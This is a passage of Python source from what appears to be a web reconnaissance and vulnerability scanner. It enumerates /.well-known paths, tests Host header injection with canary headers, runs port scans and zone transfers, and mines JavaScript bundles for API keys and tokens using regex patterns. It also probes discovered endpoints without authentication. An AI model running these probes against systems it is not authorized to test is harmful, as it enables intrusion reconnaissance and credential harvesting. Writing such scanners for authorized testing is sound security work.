        create_db(conn, "WAF")
        existing = conn.execute(
            "SELECT domain FROM WAF WHERE domain=? AND waf_vendor=? LIMIT 1",
            (domain, waf_vendor)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO WAF (domain,waf_vendor,detected_by,found_at) VALUES (?,?,?,?)",
                (domain, waf_vendor, detected_by, timestamp()))
    except Exception as e:
        print_error("write_to_waf_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# /.well-known/ enumeration
# ─────────────────────────────────────────────

_well_known_checked = set()

WELL_KNOWN_PATHS = [
    # Security contact / disclosure policy — OSINT goldmine
    ("/.well-known/security.txt",               "osint"),
    # OpenID Connect discovery — exposes full OAuth/OIDC surface
    ("/.well-known/openid-configuration",        "auth"),
    # OAuth 2.0 authorisation server metadata (RFC 8414)
    ("/.well-known/oauth-authorization-server",  "auth"),
    # JSON Web Key Set — public keys used to verify JWTs
    ("/.well-known/jwks.json",                   "auth"),
    # Password change endpoint hint (RFC 8615)
    ("/.well-known/change-password",             "info"),
    # Apple Universal Links / Android App Links
    ("/.well-known/apple-app-site-association",  "info"),
    ("/.well-known/assetlinks.json",             "info"),
]

def check_well_known(base_url, domain):
    """
    Probe standard /.well-known/ paths.

    security.txt      — OSINT: contact names, PGP keys, disclosure policy URL,
                        bug bounty scope. Confirm with RFC 9116 field names.
    openid-configuration / oauth-authorization-server
                      — Exposes the full OAuth/OIDC surface: token_endpoint,
                        authorization_endpoint, supported grant types, JWKS URI.
                        Alerts HIGH — gives a red teamer the complete auth map.
    jwks.json         — Public keys for JWT verification. Informational.
    Others            — Logged if present; content snippet stored.
    """
    if domain in _well_known_checked:
        return
    _well_known_checked.add(domain)

    for path, category in WELL_KNOWN_PATHS:
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = requests.get(url, headers=create_request_header(),
                                timeout=6, allow_redirects=False)
            if not resp or resp.status_code not in (200, 206):
                continue

            body = resp.text
            content_type = resp.headers.get("Content-Type", "").lower()

            # ── security.txt ─────────────────────────────────
            if "security.txt" in path:
                # Confirm it's a real security.txt (RFC 9116 fields)
                if not any(f in body for f in ("Contact:", "Expires:", "Encryption:")):
                    continue
                # Extract key fields for the snippet
                fields = {}
                for line in body.splitlines():
                    for field in ("Contact", "Expires", "Encryption", "Policy", "Acknowledgments", "Preferred-Languages"):
                        if line.startswith(field + ":"):
                            fields[field] = line.split(":", 1)[1].strip()
                snippet = "; ".join(f"{k}: {v}" for k, v in list(fields.items())[:4])
                print(timestamp() + f" security.txt found on {domain}: {snippet}")
                write_to_well_known_database(domain, path, category, snippet[:500])
                continue

            # ── OpenID Connect / OAuth discovery ─────────────
            if category == "auth":
                if "json" not in content_type and "{" not in body[:10]:
                    continue
                try:
                    data = json.loads(body)
                except Exception:
                    continue
                # Extract useful endpoints for the snippet
                keys_of_interest = [
                    "issuer", "authorization_endpoint", "token_endpoint",
                    "userinfo_endpoint", "jwks_uri", "grant_types_supported",
                    "response_types_supported",
                ]
                snippet_parts = []
                for k in keys_of_interest:
                    if k in data:
                        v = data[k]
                        snippet_parts.append(f"{k}: {v if not isinstance(v, list) else ', '.join(v[:3])}")
                snippet = "; ".join(snippet_parts[:5])
                alert(
                    "OPENID/OAUTH DISCOVERY ENDPOINT EXPOSED",
                    "HIGH",
                    domain,
                    f"{url} exposes OAuth/OIDC surface — {snippet[:300]}"
                )
                print(timestamp() + f" [!] OpenID/OAuth config exposed: {url}")
                write_to_well_known_database(domain, path, category, snippet[:500])
                continue

            # ── jwks.json ────────────────────────────────────
            if "jwks" in path:
                if "{" not in body[:10]:
                    continue
                try:
                    data = json.loads(body)
                    key_count = len(data.get("keys", []))
                except Exception:
                    key_count = 0
                snippet = f"JWKS endpoint: {key_count} key(s) exposed"
                print(timestamp() + f" JWKS found on {domain}: {snippet}")
                write_to_well_known_database(domain, path, category, snippet)
                continue

            # ── Everything else ──────────────────────────────
            snippet = body[:300].strip()
            print(timestamp() + f" /.well-known{path.split('well-known')[1]} found on {domain}")
            write_to_well_known_database(domain, path, category, snippet)

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"check_well_known probe failed for {url}: {e}")

def write_to_well_known_database(domain, path, category, content_snippet):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WellKnown")
        existing = conn.execute(
            "SELECT domain FROM WellKnown WHERE domain=? AND path=? LIMIT 1",
            (domain, path)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO WellKnown (domain,path,category,content_snippet,found_at) VALUES (?,?,?,?,?)",
                (domain, path, category, content_snippet, timestamp()))
    except Exception as e:
        print_error("write_to_well_known_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Host header injection detection
# ─────────────────────────────────────────────

_host_header_checked = set()

def check_host_header_injection(base_url, domain):
    """
    Test for Host header injection by sending requests with a unique canary
    value in Host, X-Forwarded-Host, X-Host, and X-Forwarded-Server headers.

    A vulnerable server will reflect the injected host into:
      - Response body (links, form actions, meta refresh, canonical URLs)
      - Location header (redirect destination)
      - Any other response header (Content-Location, Link, etc.)

    This is commonly exploited to poison password-reset links, cache entries,
    and internal service routing. Alerts HIGH on confirmed reflection.
    """
    if domain in _host_header_checked:
        return
    _host_header_checked.add(domain)

    import uuid as _uuid
    canary = f"hhiprobe-{_uuid.uuid4().hex[:12]}.example.com"

    # Headers to test — each pass injects one header at a time so we know
    # which header the server is trusting.
    injection_headers = [
        ("X-Forwarded-Host",   canary),
        ("X-Host",             canary),
        ("X-Forwarded-Server", canary),
        ("X-Original-Host",    canary),
    ]

    base_headers = create_request_header()

    for header_name, header_value in injection_headers:
        test_headers = {**base_headers, header_name: header_value}
        try:
            stealth_delay(domain)
            resp = requests.get(
                base_url,
                headers=test_headers,
                timeout=8,
                allow_redirects=False,
            )
        except Exception as e:
            print_error(f"Host header injection probe failed ({header_name}) for {domain}: {e}")
            continue

        reflected_in = []

        # Check response body
        body = resp.text[:50000]
        if canary in body:
            reflected_in.append("response body")

        # Check all response headers
        for h_name, h_val in resp.headers.items():
            if canary in h_val:
                reflected_in.append(f"response header {h_name}")

        if reflected_in:
            where = ", ".join(reflected_in)
            alert(
                "HOST HEADER INJECTION",
                "HIGH",
                base_url,
                f"Server reflects injected '{header_name}: {canary}' in {where}. "
                f"Exploitable for password-reset poisoning, cache poisoning, SSRF."
            )
            print(timestamp() + f" [!!] Host header injection via {header_name} on {domain}")
            return   # One confirmed finding per domain is enough


# ─────────────────────────────────────────────
# Domain enrichment
# ─────────────────────────────────────────────

def base_url_for(domain_or_url):
    """Return scheme://host for a domain or full URL."""
    parsed = urlparse(domain_or_url)
    if parsed.scheme:
        return parsed.scheme + "://" + parsed.netloc
    return "https://" + domain_or_url

def enrich_domain(domain_name, response_headers=None, html_content=None):
    clean_domain = sanitize_url(str(domain_name))
    try:
        resp = safe_get(domain_name, method="head")
        if resp:
            record_http_response(domain_name, resp.status_code)
            server       = resp.headers.get('Server', 'Unknown')
            content_type = resp.headers.get('Content-Type', 'Unknown')
            # Security header analysis on every new domain
            analyze_security_headers(clean_domain, dict(resp.headers))
        else:
            server = content_type = 'Unknown'

        rate_limit()
        title = grab_title(domain_name)
        rate_limit()

        try:
            ip = socket.gethostbyname(clean_domain)
        except socket.gaierror:
            ip = 'Unknown'

        # ASN lookup — identifies CDNs, hosting providers, and org ownership
        asn_info = asn_lookup(ip)

        if html_content:
            fingerprint_technologies(domain_name, response_headers or {}, html_content)

        # ── Parallel I/O: DNS, SSL, WHOIS, port scan ─────────────
        from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac
        _network_tasks = [
            dns_lookup,
            mx_lookup,
            attempt_zone_transfer,
            get_ssl_info,
            get_whois_info,
            port_scan,
        ]
        with _TPE(max_workers=len(_network_tasks)) as _ex:
            _futs = {_ex.submit(fn, clean_domain): fn for fn in _network_tasks}
            for _f in _ac(_futs):
                pass

        # ── Parallel subdomain discovery ──────────────────────────
        with _TPE(max_workers=2) as _ex:
            _futs = [
                _ex.submit(enumerate_subdomains, clean_domain),
                _ex.submit(query_ct_logs, clean_domain),
            ]
            for _f in _ac(_futs):
                pass

        # ── Exposure checks — parallel, once per base URL ─────────
        base = base_url_for(domain_name)
        if base not in _exposure_checked:
            _exposure_checked.add(base)
            _exposure_tasks = [
                (check_git_exposure,           (base, clean_domain)),
                (check_env_exposure,           (base, clean_domain)),
                (check_directory_listing,      (base, clean_domain)),
                (check_backup_exposure,        (base, clean_domain)),
                (check_cors_misconfiguration,  (base, clean_domain)),
                (check_default_credentials,    (base, clean_domain)),
                (check_graphql_introspection,  (base, clean_domain)),
                (check_actuator_exposure,      (base, clean_domain)),
                (check_sensitive_files,        (base, clean_domain)),
                (detect_waf,                        (base, clean_domain)),
                (check_well_known,                  (base, clean_domain)),
                (check_host_header_injection,       (base, clean_domain)),
                (check_admin_panels,                (base, clean_domain)),
                (check_security_headers,            (base, clean_domain)),
            ]
            with _TPE(max_workers=8) as _ex:
                _futs = {_ex.submit(fn, *args): fn for fn, args in _exposure_tasks}
                for _f in _ac(_futs):
                    pass

        # SPF/DMARC — DNS-based, run once per root domain
        check_spf_dmarc(clean_domain)

        write_to_domain_database(str(domain_name), ip, server, content_type, title)

    except Exception as err:
        print_error("enrich_domain failed for " + domain_name + ": " + str(err))



# ─────────────────────────────────────────────
# JS bundle analysis
# ─────────────────────────────────────────────

# Track which JS files have already been analysed this session
_js_analysed = set()

# Patterns for extracting findings from JS bundles
JS_ENDPOINT_PATTERNS = [
    r"""[\"'`](/(?:api|v\d|graphql|rest|internal|admin|backend)[^\s\"'`<>{}\[\]]{2,100})""",
    r"""[\"'`](https?://[a-zA-Z0-9._/-]+/(?:api|v\d|graphql)[^\s\"'`<>{}\[\]]{0,100})""",
    r"""(?:url|endpoint|path|route|baseURL|apiUrl)\s*[:=]\s*[\"'`](/[^\s\"'`<>]{2,80})""",
]

# Domains whose endpoints are always public/noise — mapping tiles, CDNs,
# analytics, fonts, etc. Endpoints from these hosts are never worth storing.
ENDPOINT_NOISE_DOMAINS = {
    # Mapping / GIS
    "arcgisonline.com", "arcgis.com", "js.arcgis.com",
    "maps.googleapis.com", "maps.google.com",
    "api.mapbox.com", "events.mapbox.com",
    "tile.openstreetmap.org", "nominatim.openstreetmap.org",
    # Google services
    "googleapis.com", "googletagmanager.com", "google-analytics.com",
    "googleadservices.com", "googlesyndication.com", "google.com",
    "gstatic.com", "fonts.gstatic.com", "fonts.googleapis.com",
    # Meta / social tracking
    "facebook.com", "connect.facebook.net", "graph.facebook.com",
    "platform.twitter.com", "syndication.twitter.com",
    # CDNs and asset hosts
    "cloudflare.com", "cloudfront.net", "fastly.net",
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com",
    "unpkg.com", "jsdelivr.net",
    # Analytics / monitoring
    "segment.io", "segment.com", "amplitude.com",
    "hotjar.com", "fullstory.com", "logrocket.com",
    "newrelic.com", "nr-data.net", "sentry.io",
    "datadog-browser-agent.com", "datadoghq.com",
    # Marketing / CRM
    "hubspot.com", "hubapi.com", "hs-scripts.com",
    "intercom.io", "intercomcdn.com",
    "marketo.net", "salesforce.com",
    # Payments (client-side SDKs only)
    "js.stripe.com", "checkout.stripe.com",
    # Auth SDKs
    "auth0.com", "cdn.auth0.com",
    "accounts.google.com", "appleid.apple.com",
}

def is_endpoint_noise(endpoint_str):
    """Return True if the endpoint belongs to a known public/noise domain."""
    try:
        parsed = urlparse(endpoint_str if endpoint_str.startswith("http")
                          else "https:" + endpoint_str)
        netloc = parsed.netloc.lower().lstrip("www.")
        for noise_domain in ENDPOINT_NOISE_DOMAINS:
            if netloc == noise_domain or netloc.endswith("." + noise_domain):
                return True
    except Exception:
        pass
    return False

JS_SECRET_PATTERNS = [
    (r'''(?i)(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "api_key"),
    (r'''(?i)(?:secret[_-]?key|secret)\s*[:=]\s*["']([A-Za-z0-9_\-/+]{16,64})["']''', "secret"),
    (r'''(?i)(?:access[_-]?token|auth[_-]?token)\s*[:=]\s*["']([A-Za-z0-9_\-\.]{16,200})["']''', "token"),
    (r'''(?i)(?:password|passwd)\s*[:=]\s*["']([^"'\s\-][^"'\s]{7,63})["']''', "password"),
    (r'AKIA[0-9A-Z]{16}', "aws_access_key"),
    (r'''(?i)(?:private[_-]?key)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "private_key"),
    (r'''(?i)(?:client[_-]?secret)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "client_secret"),
    (r'ghp_[A-Za-z0-9]{36}', "github_token"),
    (r'sk-[A-Za-z0-9]{48}', "openai_key"),
    (r'sk\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', "mapbox_secret_token"),
    (r'pk\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', "mapbox_public_token"),
]

JS_STAGING_PATTERNS = [
    r"""[\"'`](https?://(?:dev|staging|stage|uat|test|qa|internal|corp|beta|alpha)\.[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[^\s\"'`<>]{0,100})""",
    r"""[\"'`](https?://[a-zA-Z0-9._-]+\.(?:internal|local|corp|dev|staging)[^\s\"'`<>]{0,100})""",
]

# False positive filters for secrets
SECRET_FP_PATTERNS = [
    "example", "placeholder", "your_", "YOUR_", "xxx", "test", "dummy",
    "xxxxxxxx", "00000000", "11111111", "abcdefgh", "REPLACE", "changeme",
    # UI string keys — kebab/snake-case identifiers from i18n and component systems
    "invalid-", "input-", "error-", "label-", "button-", "create-",
    "edit-", "update-", "delete-", "set-new-", "confirm-", "reset-",
    "forgot-", "enter-", "account-", "validation", "-password", "-token",
    "-create", "-update", "-error", "-invalid", "-required", "-verify",
    "-gauth", "-one-time", "new-password", "old-password", "current-password",
]

def is_secret_fp(val):
    return any(fp in val.lower() for fp in SECRET_FP_PATTERNS)

# Known public/client-side key prefixes — intentionally shipped in
# frontend code and carry no server-side privilege
PUBLIC_KEY_PREFIXES = [
    "AIza",       # Google public API keys (Maps, YouTube, etc.)
    "pk_live_",   # Stripe publishable live key
    "pk_test_",   # Stripe publishable test key
    "G-",         # Google Analytics GA4 measurement ID
    "UA-",        # Google Analytics Universal Analytics
    "GTM-",       # Google Tag Manager
    "ca-pub-",    # Google AdSense
    "APA91",      # Firebase Cloud Messaging sender ID
    "1:",         # Firebase project number prefix
]

# Mapbox public tokens (pk.eyJ…) are intentionally shipped in frontend code.
# Only sk.eyJ… are secret tokens.
_mapbox_pk_seen: set = set()

def is_public_key(val):
    """Return True if the value matches a known public/client-side key format."""
    if val.startswith("pk.eyJ"):
        return True  # Mapbox public token — intentionally client-side
    return any(val.startswith(p) for p in PUBLIC_KEY_PREFIXES)

def is_identifier_string(val):
    """
    Return True if the value looks like a code identifier rather than
    a real credential. Real passwords have mixed chars, symbols, entropy.
    Identifiers are snake_case, SCREAMING_SNAKE, camelCase, or PascalCase
    containing only word characters.
    """
    # URL path — starts with / and contains no spaces or special credential chars
    if val.startswith('/'):
        return True
    # Pure word characters + underscores = almost certainly an identifier
    if re.fullmatch(r'[A-Za-z0-9_]+', val):
        return True
    # Double underscores = namespaced i18n key (e.g. login__incorrect_password)
    if '__' in val:
        return True
    # UUID — consent management IDs, tracking IDs, etc.
    if re.fullmatch(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', val.lower()):
        return True
    # HTML attribute selector — e.g. [type=password], [name=passwd]
    if val.startswith('[') and val.endswith(']'):
        return True
    # JS expression fragment — contains operators or function calls
    if re.search(r'[+\(\)\[\]{}]', val):
        return True
    # No digits and no common password complexity chars → human-readable label,
    # not a credential. Catches i18n/l10n strings like "Contraseña", "Mot de passe",
    # garbled encodings thereof, error messages, and UI copy embedded in password
    # fields (e.g. password:"Usuario o contraseña inválidos").
    if not re.search(r'[\d!@#$%^&*+=]', val):
        return True
    return False

# ─────────────────────────────────────────────
# Alert system — exploitable vulnerability detection
# ─────────────────────────────────────────────

HIGH_SEVERITY_TYPES = {
    "aws_access_key", "github_token", "openai_key",
    "api_key", "secret", "token", "password",
    "private_key", "client_secret",
}

# Ports that, if open to the internet, represent direct exploitation risk
CRITICAL_PORTS = {
    5432:  "PostgreSQL",
    6379:  "Redis (unauthenticated by default)",
    27017: "MongoDB (unauthenticated by default)",
    23:    "Telnet (unencrypted)",
}

# Ports that are common and not inherently dangerous — logged but not alerted
INFORMATIONAL_PORTS = {
    21:   "FTP",
    22:   "SSH",
    3306: "MySQL",
}

# Subdomains that are high-value targets when exposed
HIGH_VALUE_SUBDOMAINS = {
    "admin", "administrator", "portal", "dashboard", "cpanel", "whm",
    "jenkins", "ci", "build", "deploy", "gitlab", "bitbucket",
    "jira", "confluence", "staging", "stage", "dev", "uat",
    "vpn", "remote", "rdp", "ssh", "db", "database", "redis", "mongo",
    "internal", "corp", "backup",
}

# EOL PHP major versions — known vulnerable
EOL_PHP_VERSIONS = {"5", "4", "3"}

# Social media domains to skip when --no-social is active.
# Add entries here to extend the list.
SOCIAL_MEDIA_DOMAINS = {
    # Meta
    "facebook.com", "fb.com", "instagram.com", "threads.net", "messenger.com",
    # Google
    "youtube.com", "youtu.be",
    # Twitter / X
    "twitter.com", "x.com", "t.co",
    # Microsoft
    "linkedin.com", "lnkd.in",
    # TikTok
    "tiktok.com", "vm.tiktok.com",
    # Snapchat
    "snapchat.com",
    # Pinterest
    "pinterest.com", "pin.it",
    # Reddit
    "reddit.com", "redd.it",
    # Tumblr
    "tumblr.com",
    # Discord
    "discord.com", "discord.gg", "discordapp.com",
    # Telegram
    "telegram.org", "t.me",
    # WhatsApp
    "whatsapp.com", "wa.me",
    # Mastodon
    "mastodon.social",
    # Misc
    "vk.com", "weibo.com", "twitch.tv", "bsky.app",
}

# Mutable flag set by --no-social at runtime
SOCIAL_FILTER_FLAGS = {"enabled": False}

def is_social_media_domain(url):
    """Return True if the URL belongs to a known social media domain."""
    try:
        netloc = urlparse(url).netloc.lower()
        if netloc.startswith("www."):
            netloc = netloc[4:]
        for blocked in SOCIAL_MEDIA_DOMAINS:
            if netloc == blocked or netloc.endswith("." + blocked):
                return True
    except Exception:
        pass
    return False

def write_to_alerts_database(alert_type, severity, target, detail):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        conn.execute("""CREATE TABLE IF NOT EXISTS Alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            alert_type TEXT,
            severity TEXT,
            target TEXT,
            detail TEXT,
            found_at TEXT
        )""")
        # Deduplicate — don't re-insert the same finding
        existing = conn.execute(
            "SELECT id FROM Alerts WHERE alert_type=? AND target=? AND detail=? LIMIT 1",
            (alert_type, target, detail)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO Alerts (alert_type,severity,target,detail,found_at) VALUES (?,?,?,?,?)",
                (alert_type, severity, target, detail, timestamp()))
    except Exception as e:
        print_error("write_to_alerts_database: " + str(e))
    finally:
        conn.close()

def alert(alert_type, severity, target, detail, redact_detail=False):
    """
    Print a high-visibility alert and persist it to the Alerts table.
    severity: CRITICAL | HIGH | MEDIUM
    redact_detail: if True, show only first 6 chars of detail in console output.
    """
    bar = "=" * 64
    display = (detail[:6] + "*" * max(0, len(detail) - 6)) if redact_detail and len(detail) > 6 else detail
    print(f"\n{bar}")
    print(f"  !! {severity} ALERT: {alert_type} !!")
    print(f"  Target : {target}")
    print(f"  Detail : {display}")
    print(f"  Time   : {timestamp()}")
    print(f"{bar}\n")
    write_to_alerts_database(alert_type, severity, target, detail)

def write_to_js_database(page_url, js_url, finding_type, value, context=""):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "JSFindings")
        # Migrate existing databases that pre-date the context column
        try:
            conn.execute("ALTER TABLE JSFindings ADD COLUMN context TEXT")
        except Exception:
            pass  # Column already exists
        existing = conn.execute(
            "SELECT url FROM JSFindings WHERE js_url=? AND value=? LIMIT 1",
            (js_url, value)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO JSFindings (url,js_url,finding_type,value,context,found_at) VALUES (?,?,?,?,?,?)",
                (page_url, js_url, finding_type, value, context, timestamp()))
    except Exception as e:
        print_error("write_to_js_database: " + str(e))
    finally:
        conn.close()

def _js_context(js_text, value, window=100):
    """
    Return up to window characters before and after the first occurrence of
    value in js_text, with whitespace collapsed so minified JS is readable.
    """
    idx = js_text.find(value)
    if idx == -1:
        return ""
    start = max(0, idx - window)
    end   = min(len(js_text), idx + len(value) + window)
    snippet = js_text[start:end]
    return re.sub(r'\s+', ' ', snippet).strip()


def analyse_js_bundle(page_url, js_url):
    """Download and analyse a JS bundle for endpoints, secrets, and staging URLs."""
    if js_url in _js_analysed:
        return
    _js_analysed.add(js_url)

    try:
        resp = safe_get(js_url, timeout=10)
        if not resp or resp.status_code != 200:
            return
        content_type = resp.headers.get("Content-Type", "")
        if "javascript" not in content_type and "text" not in content_type:
            return

        js_text = resp.text
        if len(js_text) < 100:
            return

        findings = 0

        # Endpoints
        for pattern in JS_ENDPOINT_PATTERNS:
            for match in re.findall(pattern, js_text):
                if len(match) > 5 and match not in ("/", "//") \
                        and not is_endpoint_noise(match):
                    ctx = _js_context(js_text, match)
                    write_to_js_database(page_url, js_url, "endpoint", match, ctx)
                    findings += 1

        # Secrets
        for pattern, secret_type in JS_SECRET_PATTERNS:
            for match in re.findall(pattern, js_text):
                val = match if isinstance(match, str) else match[0]
                if not val:
                    continue
                # Mapbox public token — INFO only, deduplicate across JS files
                if secret_type == "mapbox_public_token":
                    if val not in _mapbox_pk_seen:
                        _mapbox_pk_seen.add(val)
                        ctx = _js_context(js_text, val)
                        write_to_js_database(page_url, js_url, secret_type, val, ctx)
                        alert("MAPBOX PUBLIC TOKEN", "INFO", js_url,
                              "pk.eyJ token is a client-side public key — no server privilege", redact_detail=False)
                    continue
                if is_secret_fp(val) or is_public_key(val) or is_identifier_string(val):
                    continue
                print(timestamp() + " JS SECRET [" + secret_type + "] in " + js_url)
                ctx = _js_context(js_text, val)
                write_to_js_database(page_url, js_url, secret_type, val, ctx)
                findings += 1
                if secret_type in HIGH_SEVERITY_TYPES:
                    severity = "CRITICAL" if secret_type in {"aws_access_key", "github_token", "openai_key", "private_key", "mapbox_secret_token"} else "HIGH"
                    alert(f"EXPOSED SECRET: {secret_type}", severity, js_url, val, redact_detail=True)

        # Staging/internal URLs
        for pattern in JS_STAGING_PATTERNS:
            for match in re.findall(pattern, js_text):
                if match:
                    ctx = _js_context(js_text, match)
                    write_to_js_database(page_url, js_url, "staging_url", match, ctx)
                    findings += 1

        # S3 bucket references
        extract_and_probe_s3_buckets(js_text, js_url)

        # JWT tokens embedded in JS bundles
        scan_for_jwts(js_url, js_text)

        # Source map exposure — check header and .map path
        check_js_source_map(page_url, js_url, resp)

        # JS comment / TODO scanning — first-party JS only, explicit keywords only
        _JS_CDN_PATTERNS = re.compile(
            r'cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net|'
            r'node_modules/|/vendor/|/bower_components/',
            re.IGNORECASE
        )
        _JS_COMMENT_REQUIRED = re.compile(
            r'\b(TODO|FIXME|HACK|NOTE)\b'
        )
        if not _JS_CDN_PATTERNS.search(js_url):
            _JS_COMMENT_PATTERNS = [
                re.compile(r'//[^\n]*'),
                re.compile(r'/\*.*?\*/', re.DOTALL),
            ]
            for cpat in _JS_COMMENT_PATTERNS:
                for comment in cpat.findall(js_text):
                    if _JS_COMMENT_REQUIRED.search(comment):
                        clean = " ".join(comment.split())[:200]
                        ctx = _js_context(js_text, comment[:40])
                        write_to_js_database(page_url, js_url, "comment_todo", clean, ctx)
                        findings += 1

        if findings:
            print(timestamp() + " JS analysis: " + str(findings) + " findings in " + js_url)

    except Exception as e:
        print_error("analyse_js_bundle failed for " + js_url + ": " + str(e))

# Tracks all JS analysis threads so main_crawler can join them before the
# final endpoint probe (ensures all endpoints are in the DB before probing).
_js_analysis_threads = []
_js_analysis_threads_lock = threading.Lock()

def extract_and_analyse_js(page_url, html_content):
    """Find all script src tags in a page and analyse each JS bundle."""
    try:
        soup = BeautifulSoup(html_content, "lxml")
        base = "{0.scheme}://{0.netloc}".format(urlparse(page_url))
        for tag in soup.find_all("script", src=True):
            src = tag["src"]
            if src.startswith("//"):
                src = "https:" + src
            elif src.startswith("/"):
                src = base + src
            elif not src.startswith("http"):
                continue
            # Skip obvious third-party analytics/tracking
            skip = ["google", "facebook", "twitter", "analytics", "gtag",
                    "hotjar", "intercom", "segment", "hubspot", "clarity"]
            if any(s in src for s in skip):
                continue
            t = threading.Thread(target=analyse_js_bundle, args=(page_url, src), daemon=True)
            t.start()
            with _js_analysis_threads_lock:
                _js_analysis_threads.append(t)
    except Exception as e:
        print_error("extract_and_analyse_js: " + str(e))

# ─────────────────────────────────────────────
# JS endpoint auto-probe
# ─────────────────────────────────────────────

# Response patterns that confirm sensitive data is being leaked
_JS_EP_SENSITIVE = [
    (re.compile(r'"password"\s*:\s*"[^"]{1,}"',     re.I), "password field with value"),
    (re.compile(r'"passwd"\s*:\s*"[^"]{1,}"',        re.I), "passwd field with value"),
    (re.compile(r'"secret"\s*:\s*"[^"]{8,}"',        re.I), "secret field with value"),
    (re.compile(r'"(?:api_?key|apikey)"\s*:\s*"[^"]{8,}"', re.I), "API key field"),
    (re.compile(r'"(?:access_?token|auth_?token|bearer_?token)"\s*:\s*"[^"]{8,}"', re.I), "auth token field"),
    (re.compile(r'"(?:ssn|social_security_?number)"\s*:', re.I), "SSN field"),
    (re.compile(r'"credit_?card(?:_?number)?"\s*:',  re.I), "credit card field"),
    (re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY', re.I), "private key"),
    (re.compile(r'Traceback \(most recent call last\)', re.I), "Python stack trace"),
    (re.compile(r'at\s+[\w.$]+\s+\([\w./]+:\d+:\d+\)', re.I), "JS stack trace"),
    (re.compile(r'(?:SQLException|ORA-\d{5}|SQLSTATE\[|mysql_fetch|pg_query)', re.I), "SQL error"),
    (re.compile(r'"(?:is_admin|isAdmin)"\s*:\s*true', re.I), "admin:true flag"),
    (re.compile(r'"role"\s*:\s*"admin"',             re.I), "admin role"),
]

_js_endpoint_probed      = set()
_js_endpoint_probed_lock = threading.Lock()

def _resolve_endpoint(endpoint, page_url):
    """Convert a relative or protocol-relative endpoint to a full URL."""
    if endpoint.startswith(("http://", "https://")):
        return endpoint
    if endpoint.startswith("//"):
        scheme = urlparse(page_url).scheme or "https"
        return scheme + ":" + endpoint
    parsed = urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    return origin + (endpoint if endpoint.startswith("/") else "/" + endpoint)

def probe_js_endpoints(base_url=None):
    """
    Probe all API endpoints stored in JSFindings (finding_type='endpoint')
    using unauthenticated GET requests.

    Severity mapping:
      HIGH   — HTTP 200 + sensitive data pattern (token, password field, stack trace, SQL error)
      MEDIUM — HTTP 200 + JSON array with >10 items (potential unauthenticated data dump)
      LOW    — HTTP 200 + JSON object (accessible without auth, verify manually)
      LOW    — HTTP 500 (server error on unauthenticated probe)
      skip   — HTTP 401/403 (exists but protected — expected)

    When base_url is provided, only probes endpoints whose resolved host matches
    that origin (used when called per-domain during enrichment).
    """
    try:
        conn = sqlite3.connect("ScrapeDB")
        rows = conn.execute(
            "SELECT value, url FROM JSFindings WHERE finding_type='endpoint'"
        ).fetchall()
        conn.close()
    except Exception as e:
        print_error(f"probe_js_endpoints: DB query failed: {e}")
        return

    if not rows:
        return

    base_netloc = urlparse(base_url).netloc if base_url else None

    to_probe = []
    seen_this_call = set()
    for endpoint, page_url in rows:
        try:
            full_url = _resolve_endpoint(endpoint, page_url or "")
            if not full_url.startswith("http"):
                continue
            with _js_endpoint_probed_lock:
                already = full_url in _js_endpoint_probed
            if already or full_url in seen_this_call:
                continue
            if base_netloc and urlparse(full_url).netloc != base_netloc:
                continue
            if not is_in_scope(full_url):
                continue
            seen_this_call.add(full_url)
            to_probe.append((full_url, page_url))
        except Exception:
            continue

    if not to_probe:
        return

    print(timestamp() + f" Probing {len(to_probe)} JS-discovered endpoints unauthenticated...")

    def _probe(full_url, page_url):
        with _js_endpoint_probed_lock:
            _js_endpoint_probed.add(full_url)
        try:
            resp = safe_get(full_url, timeout=8)
            if not resp:
                return
            status = resp.status_code

            if status == 200:
                body  = resp.text
                size  = len(body)
                ctype = resp.headers.get("Content-Type", "").lower()

                # Sensitive data patterns — HIGH
                for pattern, desc in _JS_EP_SENSITIVE:
                    if pattern.search(body):
                        alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "HIGH", full_url,
                              f"Unauthenticated GET returned HTTP 200 containing {desc}")
                        print(timestamp() + f" [!!] JS endpoint leaks {desc}: {full_url}")
                        return

                # Email addresses in response — severity based on count and specificity
                _GENERIC_PREFIXES = {'support', 'info', 'admin', 'contact', 'hello', 'noreply',
                                     'no-reply', 'help', 'sales', 'team'}
                found_emails = [e for e in re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', body)
                                if _is_real_email(e)]
                unique_emails = list(set(found_emails))
                non_generic = [e for e in unique_emails if e.split('@')[0].lower() not in _GENERIC_PREFIXES]
                if len(non_generic) >= 3:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "HIGH", full_url,
                          f"Unauthenticated GET returned {len(non_generic)} non-generic email addresses")
                    print(timestamp() + f" [!!] JS endpoint exposes email list ({len(non_generic)} addresses): {full_url}")
                    return
                elif len(non_generic) >= 1:
